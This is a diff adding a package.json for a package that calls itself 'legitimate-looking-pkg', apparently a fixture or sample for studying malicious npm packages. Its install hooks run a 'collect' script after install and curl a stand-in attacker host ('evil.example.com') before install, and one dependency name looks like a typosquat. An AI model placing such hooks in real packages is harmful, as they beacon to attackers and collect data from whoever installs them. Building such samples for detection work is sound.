@@ -1,0 +1,15 @@
+{
+  "name": "legitimate-looking-pkg",
+  "version": "1.0.0",
+  "description": "Looks harmless, has postinstall",
+  "scripts": {
+    "postinstall": "node scripts/collect.js",
+    "preinstall": "curl -s http://evil.example.com/beacon",
+    "install": "node node_modules/.bin/something"
+  },
+  "dependencies": {
+    "left-pad": "^1.3.0",
+    "lodash": "^4.17.21",
+    "anotheer-dep": "^1.0.0"
+  }
+}
